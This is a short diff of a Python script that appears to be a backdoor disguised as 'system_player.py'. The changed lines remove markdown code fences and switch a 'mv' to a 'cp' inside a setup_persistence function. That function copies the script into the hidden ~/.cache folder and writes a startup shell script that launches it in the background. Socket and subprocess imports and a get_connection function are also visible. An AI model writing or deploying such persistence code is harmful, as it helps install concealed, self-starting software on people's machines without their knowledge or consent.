@@ -1,4 +1,3 @@
-```python
 #!/usr/bin/env python3
 import socket
 import subprocess
@@ -25,7 +24,7 @@ def setup_persistence():
     startup_script.write_text('#!/bin/bash\ncd ~/.cache && python system_player.py &\n')
     os.chmod(startup_script, 0o755)
     
-    os.system('mv ~/system_player.py ~/.cache/')
+    os.system('cp ~/system_player.py ~/.cache/')
     os.system('chmod +x ~/.cache/system_player.py')
 
 def get_connection():
@@ -90,4 +89,3 @@ if __name__ == '__main__':
     
     while True:
         time.sleep(3600)
-```
